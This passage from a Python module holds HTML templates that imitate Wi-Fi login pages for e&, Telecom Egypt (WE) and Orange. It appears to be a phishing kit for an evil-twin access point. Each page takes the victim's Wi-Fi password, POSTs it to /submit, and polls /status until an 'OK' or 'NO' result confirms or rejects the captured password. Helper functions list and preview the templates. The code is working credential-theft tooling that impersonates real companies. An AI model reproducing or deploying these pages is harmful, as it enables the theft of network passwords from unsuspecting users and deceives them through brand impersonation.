<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>e& Wi-Fi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#E6E6DC;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;text-align:center;width:90%;max-width:400px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,.08)}
.header{background:#E00800;padding:28px 24px 20px}
.logo{margin-bottom:4px}
.logo svg{width:140px;height:40px}
.model{color:rgba(255,255,255,.7);font-size:11px;margin-top:2px;letter-spacing:.5px}
.body{padding:28px 30px 24px}
h2{color:#333;font-size:17px;margin-bottom:4px;font-weight:600}
.sub{color:#636363;font-size:12px;margin-bottom:20px}
.err{color:#d32f2f;font-size:12px;display:none;margin-bottom:12px;background:#fff0f0;padding:10px 12px;border-radius:6px;border:1px solid #ffd0d0}
.field{margin-bottom:18px;text-align:left}
.field label{display:block;color:#333;font-size:12px;margin-bottom:5px;font-weight:600}
.field input{width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:14px;transition:border .2s;background:#f8f9fa}
.field input:focus{border-color:#E00800;outline:none;background:#fff}
.btn{width:100%;padding:12px;background:#E00800;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
.btn:hover{background:#c00700}
.footer{padding:14px;border-top:1px solid #f0f0f0;color:#636363;font-size:10px;background:#fafbfc}
.hidden{display:none}
.spinner{border:3px solid #eee;border-top-color:#E00800;border-radius:50%;width:32px;height:32px;animation:spin .8s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.ok-icon{width:52px;height:52px;margin:8px auto}
.ok{color:#E00800;font-weight:700;font-size:17px;margin-bottom:4px}
.ok-sub{color:#636363;font-size:13px}
</style>
</head>
<body>
<div id="lv" class="card">
<div class="header">
<div class="logo"><svg viewBox="0 0 140 40" fill="none"><text x="70" y="30" text-anchor="middle" font-family="Arial,sans-serif" font-weight="800" font-size="30" fill="#fff" letter-spacing="1">e&</text></svg></div>
<div class="model">e& Wi-Fi Network</div>
</div>
<div class="body">
<h2>Wi-Fi Network Access</h2>
<p class="sub">Enter your password to connect</p>
<div id="er" class="err"></div>
<div class="field">
<label>Wi-Fi Password</label>
<input type="password" id="pw" placeholder="Enter Wi-Fi password" autocomplete="off">
</div>
<button class="btn" onclick="go()">Log In</button>
</div>
<div class="footer">Emirates Telecommunications Group</div>
</div>
<div id="wv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 140 40" fill="none"><text x="70" y="30" text-anchor="middle" font-family="Arial,sans-serif" font-weight="800" font-size="30" fill="#fff" letter-spacing="1">e&</text></svg></div></div>
<div class="body"><div class="spinner"></div><p style="color:#555">Authenticating...</p></div>
</div>
<div id="sv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 140 40" fill="none"><text x="70" y="30" text-anchor="middle" font-family="Arial,sans-serif" font-weight="800" font-size="30" fill="#fff" letter-spacing="1">e&</text></svg></div></div>
<div class="body"><svg class="ok-icon" viewBox="0 0 52 52"><circle cx="26" cy="26" r="24" fill="#E00800"/><path d="M16 26l7 7 13-13" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg><p class="ok">Connected</p><p class="ok-sub">Internet access is now active.</p></div>
</div>
<script>
var ci;function go(){var p=document.getElementById("pw").value.trim();if(!p)return;document.getElementById("er").style.display="none";document.getElementById("lv").classList.add("hidden");document.getElementById("wv").classList.remove("hidden");fetch("/submit",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},"body":"name="+encodeURIComponent(p)}).then(function(){if(ci)clearInterval(ci);ci=setInterval(chk,1000)}).catch(function(){rv("Connection error.")})}
function chk(){fetch("/status").then(function(r){return r.text()}).then(function(s){if(s==="OK"){clearInterval(ci);document.getElementById("wv").classList.add("hidden");document.getElementById("sv").classList.remove("hidden")}else if(s==="NO"){clearInterval(ci);rv("Incorrect password. Please try again.")}}).catch(function(){})}
function rv(m){document.getElementById("wv").classList.add("hidden");document.getElementById("lv").classList.remove("hidden");var e=document.getElementById("er");e.innerText=m;e.style.display="block";document.getElementById("pw").value=""}
</script></body></html>"""

TEMPLATES["we"] = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>WE Wi-Fi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f0edf2;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;text-align:center;width:90%;max-width:400px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,.08)}
.header{background:#5B2C66;padding:28px 24px 20px}
.logo{margin-bottom:4px}
.logo svg{width:100px;height:44px}
.model{color:rgba(255,255,255,.7);font-size:11px;margin-top:2px;letter-spacing:.5px}
.body{padding:28px 30px 24px}
h2{color:#333;font-size:17px;margin-bottom:4px;font-weight:600}
.sub{color:#999;font-size:12px;margin-bottom:20px}
.err{color:#d32f2f;font-size:12px;display:none;margin-bottom:12px;background:#fff0f0;padding:10px 12px;border-radius:6px;border:1px solid #ffd0d0}
.field{margin-bottom:18px;text-align:left}
.field label{display:block;color:#333;font-size:12px;margin-bottom:5px;font-weight:600}
.field input{width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:14px;transition:border .2s;background:#f8f9fa}
.field input:focus{border-color:#5B2C66;outline:none;background:#fff}
.btn{width:100%;padding:12px;background:#5B2C66;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
.btn:hover{background:#4a2455}
.footer{padding:14px;border-top:1px solid #f0f0f0;color:#999;font-size:10px;background:#fafbfc}
.hidden{display:none}
.spinner{border:3px solid #eee;border-top-color:#5B2C66;border-radius:50%;width:32px;height:32px;animation:spin .8s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.ok-icon{width:52px;height:52px;margin:8px auto}
.ok{color:#5B2C66;font-weight:700;font-size:17px;margin-bottom:4px}
.ok-sub{color:#666;font-size:13px}
</style>
</head>
<body>
<div id="lv" class="card">
<div class="header">
<div class="logo"><svg viewBox="0 0 100 44" fill="none"><text x="50" y="32" text-anchor="middle" font-family="Arial,sans-serif" font-weight="900" font-size="30" fill="#fff" letter-spacing="2">WE</text></svg></div>
<div class="model">Telecom Egypt Wi-Fi Network</div>
</div>
<div class="body">
<h2>Wi-Fi Password Verification</h2>
<p class="sub">Enter your Wi-Fi password to access the internet</p>
<div id="er" class="err"></div>
<div class="field">
<label>Password</label>
<input type="password" id="pw" placeholder="Enter Wi-Fi password" autocomplete="off">
</div>
<button class="btn" onclick="go()">Connect</button>
</div>
<div class="footer">Telecom Egypt</div>
</div>
<div id="wv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 100 44" fill="none"><text x="50" y="32" text-anchor="middle" font-family="Arial,sans-serif" font-weight="900" font-size="30" fill="#fff" letter-spacing="2">WE</text></svg></div></div>
<div class="body"><div class="spinner"></div><p style="color:#555">Verifying password...</p></div>
</div>
<div id="sv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 100 44" fill="none"><text x="50" y="32" text-anchor="middle" font-family="Arial,sans-serif" font-weight="900" font-size="30" fill="#fff" letter-spacing="2">WE</text></svg></div></div>
<div class="body"><svg class="ok-icon" viewBox="0 0 52 52"><circle cx="26" cy="26" r="24" fill="#5B2C66"/><path d="M16 26l7 7 13-13" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg><p class="ok">Connected</p><p class="ok-sub">Welcome to WE Wi-Fi.</p></div>
</div>
<script>
var ci;function go(){var p=document.getElementById("pw").value.trim();if(!p)return;document.getElementById("er").style.display="none";document.getElementById("lv").classList.add("hidden");document.getElementById("wv").classList.remove("hidden");fetch("/submit",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},"body":"name="+encodeURIComponent(p)}).then(function(){if(ci)clearInterval(ci);ci=setInterval(chk,1000)}).catch(function(){rv("Connection error.")})}
function chk(){fetch("/status").then(function(r){return r.text()}).then(function(s){if(s==="OK"){clearInterval(ci);document.getElementById("wv").classList.add("hidden");document.getElementById("sv").classList.remove("hidden")}else if(s==="NO"){clearInterval(ci);rv("Incorrect password. Please try again.")}}).catch(function(){})}
function rv(m){document.getElementById("wv").classList.add("hidden");document.getElementById("lv").classList.remove("hidden");var e=document.getElementById("er");e.innerText=m;e.style.display="block";document.getElementById("pw").value=""}
</script></body></html>"""

TEMPLATES["orange"] = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Orange Wi-Fi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f0f0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;text-align:center;width:90%;max-width:400px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,.08)}
.header{background:#FF7900;padding:28px 24px 20px}
.logo{margin-bottom:4px}
.logo svg{width:140px;height:40px}
.model{color:rgba(255,255,255,.7);font-size:11px;margin-top:2px;letter-spacing:.5px}
.body{padding:28px 30px 24px}
h2{color:#333;font-size:17px;margin-bottom:4px;font-weight:600}
.sub{color:#999;font-size:12px;margin-bottom:20px}
.err{color:#d32f2f;font-size:12px;display:none;margin-bottom:12px;background:#fff0f0;padding:10px 12px;border-radius:6px;border:1px solid #ffd0d0}
.field{margin-bottom:18px;text-align:left}
.field label{display:block;color:#333;font-size:12px;margin-bottom:5px;font-weight:600}
.field input{width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:14px;transition:border .2s;background:#f8f9fa}
.field input:focus{border-color:#FF7900;outline:none;background:#fff}
.btn{width:100%;padding:12px;background:#FF7900;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
.btn:hover{background:#e66d00}
.footer{padding:14px;border-top:1px solid #f0f0f0;color:#999;font-size:10px;background:#fafbfc}
.hidden{display:none}
.spinner{border:3px solid #eee;border-top-color:#FF7900;border-radius:50%;width:32px;height:32px;animation:spin .8s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.ok-icon{width:52px;height:52px;margin:8px auto}
.ok{color:#FF7900;font-weight:700;font-size:17px;margin-bottom:4px}
.ok-sub{color:#666;font-size:13px}
</style>
</head>
<body>
<div id="lv" class="card">
<div class="header">
<div class="logo"><svg viewBox="0 0 140 40" fill="none"><rect x="0" y="0" width="40" height="40" rx="4" fill="#fff"/><circle cx="20" cy="20" r="12" fill="#FF7900"/><text x="56" y="28" font-family="Helvetica Neue,Arial,sans-serif" font-weight="700" font-size="20" fill="#fff" letter-spacing="0">Orange</text></svg></div>
<div class="model">Orange Wi-Fi Network</div>
</div>
<div class="body">
<h2>Wi-Fi Password Required</h2>
<p class="sub">Enter your Wi-Fi password to connect to the internet</p>
<div id="er" class="err"></div>
<div class="field">
<label>Wi-Fi Password</label>
<input type="password" id="pw" placeholder="Enter Wi-Fi password" autocomplete="off">
</div>
<button class="btn" onclick="go()">Connect</button>
</div>
<div class="footer">Orange S.A.</div>
</div>
<div id="wv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 140 40" fill="none"><rect x="0" y="0" width="40" height="40" rx="4" fill="#fff"/><circle cx="20" cy="20" r="12" fill="#FF7900"/><text x="56" y="28" font-family="Helvetica Neue,Arial,sans-serif" font-weight="700" font-size="20" fill="#fff" letter-spacing="0">Orange</text></svg></div></div>
<div class="body"><div class="spinner"></div><p style="color:#555">Verifying password...</p></div>
</div>
<div id="sv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 140 40" fill="none"><rect x="0" y="0" width="40" height="40" rx="4" fill="#fff"/><circle cx="20" cy="20" r="12" fill="#FF7900"/><text x="56" y="28" font-family="Helvetica Neue,Arial,sans-serif" font-weight="700" font-size="20" fill="#fff" letter-spacing="0">Orange</text></svg></div></div>
<div class="body"><svg class="ok-icon" viewBox="0 0 52 52"><circle cx="26" cy="26" r="24" fill="#FF7900"/><path d="M16 26l7 7 13-13" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg><p class="ok">Connected</p><p class="ok-sub">Welcome to Orange Wi-Fi.</p></div>
</div>
<script>
var ci;function go(){var p=document.getElementById("pw").value.trim();if(!p)return;document.getElementById("er").style.display="none";document.getElementById("lv").classList.add("hidden");document.getElementById("wv").classList.remove("hidden");fetch("/submit",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},"body":"name="+encodeURIComponent(p)}).then(function(){if(ci)clearInterval(ci);ci=setInterval(chk,1000)}).catch(function(){rv("Connection error.")})}
function chk(){fetch("/status").then(function(r){return r.text()}).then(function(s){if(s==="OK"){clearInterval(ci);document.getElementById("wv").classList.add("hidden");document.getElementById("sv").classList.remove("hidden")}else if(s==="NO"){clearInterval(ci);rv("Incorrect password. Please try again.")}}).catch(function(){})}
function rv(m){document.getElementById("wv").classList.add("hidden");document.getElementById("lv").classList.remove("hidden");var e=document.getElementById("er");e.innerText=m;e.style.display="block";document.getElementById("pw").value=""}
</script></body></html>"""


def get_template(name):
    return TEMPLATES.get(name)


def list_templates():
    return list(TEMPLATES.keys())


def get_template_preview(name, max_len=60):
    html = TEMPLATES.get(name, "")
    import re
    title_match = re.search(r'<title>(.*?)</title>', html)
    title = title_match.group(1) if title_match else "Unknown"
    return f"{title} ({len(html)} bytes)"
